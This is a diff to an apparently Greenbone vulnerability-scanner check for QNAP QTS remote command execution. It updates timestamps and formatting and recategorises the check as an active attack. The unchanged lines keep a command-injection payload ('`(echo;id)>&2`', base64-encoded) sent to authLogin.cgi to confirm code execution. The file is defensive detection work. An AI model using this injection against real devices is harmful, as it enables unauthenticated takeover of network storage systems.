@@ -4,13 +4,13 @@
 #
 # SPDX-License-Identifier: GPL-2.0-only
 
-CPE = 'cpe:/o:qnap:qts';
+CPE = "cpe:/o:qnap:qts";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140238");
-  script_version("2023-09-28T05:05:04+0000");
-  script_tag(name:"last_modification", value:"2023-09-28 05:05:04 +0000 (Thu, 28 Sep 2023)");
+  script_version("2024-08-08T05:05:42+0000");
+  script_tag(name:"last_modification", value:"2024-08-08 05:05:42 +0000 (Thu, 08 Aug 2024)");
   script_tag(name:"creation_date", value:"2017-04-07 11:52:09 +0200 (Fri, 07 Apr 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -26,7 +26,7 @@ if(description)
 
   script_name("QNAP QTS < 4.2.4 Build 20170313 Multiple Vulnerabilities - Active Check");
 
-  script_category(ACT_GATHER_INFO);
+  script_category(ACT_ATTACK);
 
   script_copyright("Copyright (C) 2017 Greenbone AG");
   script_family("Web application abuses");
@@ -96,8 +96,7 @@ rmessage = base64( str: "QNAPVJBD" + t + '      Disconnect  14`(echo;id)>&2`' );
 
 url = dir + "/cgi-bin/authLogin.cgi?reboot_notice_msg=" + rmessage;
 
-if( buf = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+", check_header:TRUE ) )
-{
+if( buf = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+", check_header:TRUE ) ) {
   report = 'It was possible to execute the `id` command on the remote host.\n' +
            http_report_vuln_url(  port:port, url:url ) +
            '\n\nResponse:\n\n' + buf;
